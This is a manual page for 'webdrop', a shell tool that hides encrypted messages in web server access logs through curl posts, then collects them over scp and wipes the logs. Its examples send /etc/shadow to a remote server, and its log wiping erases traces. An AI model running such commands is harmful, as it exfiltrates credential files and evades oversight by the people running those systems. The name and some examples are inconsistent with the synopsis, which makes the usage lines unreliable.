# Name

webrop - use [CurlyTP](https://miscdotgeek.com/curlytp-every-web-server-is-a-dead-drop) to send encrypted messages

# Synopsis

```
webdrop [OPTION] load URL [FILE ...]
webdrop [OPTION] unload [HOST:]LOGFILE
```

# Description

Use [CurlyTP](https://miscdotgeek.com/curlytp-every-web-server-is-a-dead-drop)
to send encrypted messages.

`webdrop load` will encrypt each FILE individually and use `curl` to post it to
the webserver running on URL. `stdin` will be read if no FILEs are given or if
one of the FILEs is `-`.

`webdrop unload [HOST:]LOGFILE` will download the webserver logfile at
HOST:LOGFILE using `scp` and then extract each FILE currently in the log. Once
all FILEs are extracted, the remote log is wiped. If only LOGFILE is given,
`webdrop` will access LOGFILE on `localhost`.

# Options

`-h` Print a help message and exit.

`-v` Display version information.

## load command

`-r [DELAY]` delay from 1 to DELAY seconds between sending successive message
chunks (Default is no delay).

`-w [WRAP]` maximum length of a message chunk (Default = 76).

## unload command

`-p [PORT]` Use PORT to access ssh (Default = 22).

`-d [DIRECTORY]` Save extracted files to DIRECTORY (Default = .).

**NOTE:** `sudo(1)` must be installed on the remote webserver in order to delete
retrieved messages from the logs.

# Examples

`webdrop 192.168.0.1 /etc/shadow`

Post `/etc/shadow` to the webserver at `192.168.0.1`.

`webdrop 192.168.0.1 /etc/shadow -`

Post `/etc/shadow` and whatever is read from `stdin` to the webserver at
`192.168.0.1`.

`webdrop unload admin@192.168.0.1:/var/log/nginx/access.log`

Extract messages from `/var/log/nginx/access.log` on `192.168.0.1` using
`root` to login.

`webdrop unload /var/log/nginx/access.log`

Extract messages from `/var/log/nginx/access.log` on `localhost`.

# Encryption

`webdrop` requires [mcrypt](http://mcrypt.sourceforcge.net).

# See Also

[mcrypt(1)](http://mcrypt.sourceforge.net)

